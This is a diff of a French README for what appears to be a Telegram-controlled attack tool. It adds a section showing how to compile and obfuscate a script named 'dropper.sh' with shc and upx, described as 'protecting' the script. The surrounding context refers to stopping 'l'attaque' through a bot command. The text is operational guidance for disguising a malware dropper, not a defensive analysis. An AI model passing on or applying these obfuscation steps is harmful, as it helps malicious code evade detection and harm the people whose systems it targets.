@@ -93,8 +93,17 @@ sudo systemctl status gpt4_calc.service
 
 4. Commandes Telegram : Le bot Telegram sera prêt à recevoir des commandes. Envoyez /stop_calc_trhacknon pour arrêter l'attaque.
 
+---
 
+### Compilation et Obfuscation du Script `dropper.sh`
 
+Pour renforcer la confidentialité et la protection de votre script Bash `dropper.sh`, vous pouvez le compiler en binaire et l'obfusquer à l'aide de deux outils : `shc` et `upx`.
+
+La commande suivante combine les deux étapes en une seule ligne :
+
+```bash
+shc -f dropper.sh -o dropper && upx --best --lzma dropper
+```
 
 ---
 
